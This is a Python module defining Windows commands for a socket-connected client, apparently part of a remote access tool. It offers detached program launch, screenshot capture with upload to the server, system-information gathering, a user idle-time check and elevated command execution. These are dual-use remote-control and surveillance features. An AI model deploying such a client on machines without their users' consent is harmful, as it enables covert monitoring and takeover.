from client.commands.common import CommonCommands
from client.commands.interrupts import timeout, cancel_policy, interruptible
from client.commands.platform.services.win_platform_service import WinPlatformService
from core.utils.decorator import desc


class WindowsCommands(CommonCommands):
    """Windows 平台专用命令集合"""

    def __init__(self, socket):
        super().__init__(socket)
        self._win_platform_service = WinPlatformService(self)

    @desc('Run a program without waiting (detached)', group='shell')
    @interruptible()
    def run(self, command):
        """
        启动程序但不等待返回（独立运行）
        """
        return self._win_platform_service.run(command)

    # ------------------ 截图 ------------------ #
    @desc('Capture screenshot', group='platform')
    @interruptible()
    @timeout(30)
    @cancel_policy(True)
    def screenshot(self):
        """
        截图并上传到服务器
        """
        return self._win_platform_service.capture_screenshot()

    # ------------------ 系统信息 ------------------ #
    @desc('Get system information', group='platform')
    @interruptible()
    @timeout(30)
    @cancel_policy(True)
    def getinfo(self):
        """
        获取 Windows 系统信息
        """
        return self._win_platform_service.collect_system_info()

    # ------------------ 用户空闲时间 ------------------ #
    @desc('Get user idle time', group='platform')
    @interruptible()
    @timeout(10)
    @cancel_policy(True)
    def idletime(self):
        """
        获取用户空闲时间（秒）
        """
        return self._win_platform_service.get_user_idletime()

    @desc('Run command as admin', group='system')
    @interruptible()
    def runasadmin(self, command):
        """
        以管理员权限执行命令
        """
        return self._win_platform_service.run_as_admin(command)
